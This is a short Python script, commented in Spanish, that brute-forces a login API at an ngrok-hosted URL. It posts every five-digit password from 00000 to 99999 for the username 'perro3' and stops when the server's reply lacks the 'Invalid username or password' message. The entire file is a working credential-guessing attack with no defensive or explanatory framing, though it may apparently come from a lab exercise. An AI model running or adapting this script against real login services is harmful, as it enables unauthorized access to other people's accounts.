import requests

# URL de la API de inicio de sesión
url = "http://a1f0-201-185-147-53.ngrok-free.app/api"

# Datos de inicio de sesión
username = "perro3"

# Iterar sobre todas las posibles combinaciones de contraseñas de 5 dígitos (00000 a 99999)
for i in range(100000):
    password = f"{i:05d}"  # Formatear como número de 5 dígitos, p. ej., "00001"
    
    # Datos del formulario
    data = {
        "username": username,
        "password": password
    }

    # Enviar la solicitud POST con los datos del formulario
    response = requests.post(url, data=data)

    # Verificar si la respuesta indica que el inicio de sesión fue exitoso
    if "Invalid username or password" not in response.text:
        print(f"¡Contraseña encontrada! La contraseña es: {password}")
        break  # Salir del ciclo cuando se encuentra la contraseña correcta
    else:
        print(f"Intentando contraseña: {password}")

print("Proceso terminado.")
